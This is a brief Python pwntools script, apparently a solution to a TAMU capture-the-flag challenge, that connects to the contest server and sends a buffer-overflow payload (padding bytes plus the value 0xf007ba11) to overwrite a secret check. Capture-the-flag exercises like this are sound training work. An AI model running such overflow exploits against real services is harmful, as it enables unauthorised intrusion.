from pwn import *

PAYLOAD = "\x90"*23 + "\x11\xba\x07\xf0"

r = remote('pwn.ctf.tamu.edu', 4321)

def pwn():
    print r.recvuntil('What is my secret?\n')
    r.sendline(PAYLOAD)
    print r.recv()

if __name__ == "__main__":
    pwn()
